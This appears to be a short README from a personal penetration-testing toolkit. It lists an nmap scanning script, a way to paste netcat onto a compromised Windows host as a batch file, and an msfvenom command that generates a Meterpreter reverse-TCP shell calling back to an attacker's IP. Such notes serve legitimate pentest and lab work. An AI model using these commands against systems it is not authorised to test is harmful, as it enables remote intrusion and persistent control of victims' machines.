# t0w3ntum

### Files
nmap.sh - Does a full fast port scan and then individual intense scans on each port

tools/nc.txt

     Useful if you have no other way of copying netcat over to a target windows
host. To use, copy the contents of nc.txt and paste it into the remote shell. 
I use xclip like so. 

	cat nc.txt | xclip -selection clipboard

The file was created with the following method. 
[code]
	upx nc.exe
	wine exe2bat.exe nc.exe nc.txt
[/code]
### Commands

- Generate a meterpreter reverse_tcp shell. 

[code]msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe[/code]
